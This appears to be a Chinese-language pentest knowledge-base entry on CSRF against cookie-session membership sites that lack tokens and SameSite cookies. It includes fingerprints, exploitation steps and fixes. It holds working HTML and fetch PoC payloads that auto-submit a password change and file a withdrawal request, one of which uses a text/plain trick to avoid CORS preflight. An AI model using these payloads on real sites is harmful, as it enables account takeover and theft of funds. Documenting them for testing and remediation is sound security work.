---
title: CSRF（无 token 的提现/改密/绑卡）
cve: 无（实现缺陷）
severity: high
cvss: 8.0
product: 自研会员中心（Cookie 会话）
versions: 任意
ports: 80, 443
keywords: csrf, 跨站, 提现, 改密, 绑卡, token
entry: 关键操作缺 CSRF token 且 SameSite 未设
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

- 关键请求（提现/改密/绑卡）只有 Cookie，无 `csrf`/`token` 参数；
- 响应 `Set-Cookie` 无 `SameSite`。

## 前置条件

- 受害者登着目标站；攻击者能诱导其访问页面。

## PoC

```html
<!-- attacker 页面：自动提交改密 -->
<form id="f" action="https://target/api/user/updatePwd" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input name="newPwd" value="Passw0rd!2026">
  <input name="uid" value="1001">
</form>
<script>document.getElementById('f').submit()</script>
```

```html
<!-- 或 JSON 接口：用 fetch + text/plain 绕过 preflight -->
<script>
fetch('https://target/api/withdraw/apply', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'text/plain'},
  body:JSON.stringify({amount:100, bankId:9})
})
</script>
```

```bash
# 判定：自己登录后打开页面，账号被改/提现单生成 = 命中
```

## 利用步骤

1. 先确认无 token、无 SameSite；
2. 本地起页面自测（自己账号）；
3. 命中后评估操作危害（改密/提现/绑卡）；
4. 证据：请求抓包 + 服务端状态变化。

## 修复与缓解

- 关键操作加 CSRF token（一次性）+ `SameSite=Lax/Strict`；校验 Origin/Referer。

## 参考

- OWASP CSRF 防护；CWE-352。
